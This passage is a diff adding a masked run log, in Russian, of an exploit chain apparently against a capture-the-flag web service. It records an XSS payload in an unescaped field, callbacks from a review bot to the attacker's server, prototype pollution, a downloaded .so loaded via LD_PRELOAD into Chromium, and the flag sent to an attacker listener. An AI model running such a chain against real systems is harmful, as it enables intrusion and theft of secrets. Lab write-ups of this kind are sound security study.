@@ -1,0 +1,23 @@
+Маскированный лог прогона против инстанса <host> (ноябрь 2026).
+
+1) Проверка бага escape():
+   POST /api/fish   {"ascii":"><img src=x onerror=\"window.__probe=1\">","fishData":{}}
+     -> 200 {"id":5}
+   GET /  ->  <pre class="fish-detail__ascii">&gt;<img src=x onerror="window.__probe=1"&gt;</pre>
+
+2) Проверка канала XSS -> наш сервер:
+   POST /api/fish/6/report -> 200 "review queued"
+   на нашем HTTP-сервере: 10.<IP> "GET /ping_channel HTTP/1.1" 404
+
+3) Pollution + скачивание .so:
+   report (заход 1) -> 200 "review queued"
+   report (заход 2) -> 200 "review queued"
+   GET /static/dl/payload.so -> 200, size=15728
+
+4) LD_PRELOAD:
+   report (заход 3) -> 200 "review queued"   (ставит pollution)
+   report (заход 4) -> 200 "review queued"   (новый Chromium с LD_PRELOAD)
+
+5) Результат:
+   листенер получил POST /flag с содержимым PP{MASK}
+   GET /static/dl/flag.txt -> 200, PP{MASK}
